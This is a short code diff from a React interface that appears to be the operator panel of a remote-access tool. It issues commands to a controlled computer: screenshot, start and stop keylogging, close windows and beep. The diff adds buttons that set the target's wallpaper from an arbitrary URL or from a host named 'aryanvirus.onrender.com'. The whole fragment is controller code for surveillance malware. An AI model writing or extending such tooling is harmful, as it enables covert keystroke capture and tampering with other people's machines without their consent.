@@ -152,6 +152,8 @@ export default function App() {
         <button style={{ backgroundColor: "#2980b9" }} onClick={() => sendCommand("desktop", false)}>Show Desktop</button>
         <button style={{ backgroundColor: "#8e44ad" }} onClick={() => sendCommand("close", false)}>Close Window</button>
         <button style={{ backgroundColor: "#f1c40f" }} onClick={() => sendCommand("screenshot", false)}>Screenshot</button>
+        <button style={{ backgroundColor: "#f1c40f" }} onClick={() => sendCommand("urlwallpaper https://aryanvirus.onrender.com/latestupload", false)}>LU Wallpaper</button>
+        <button style={{ backgroundColor: "#2f5ac8ff" }} onClick={() => sendCommand(`urlwallpaper ${inputValue}`, true)}>URL Wallpaper</button>
         <button style={{ backgroundColor: "#f1160fff" }} onClick={() => sendCommand("startkeylog", false)}>Start KeyLog</button>
         <button style={{ backgroundColor: "#38f10fff" }} onClick={() => sendCommand("stopkeylog", false)}>Stop KeyLog</button>
         <button style={{ backgroundColor: "#2f5ac8ff" }} onClick={() => sendCommand(`playtone 2500 500`, false)}>Beep</button>
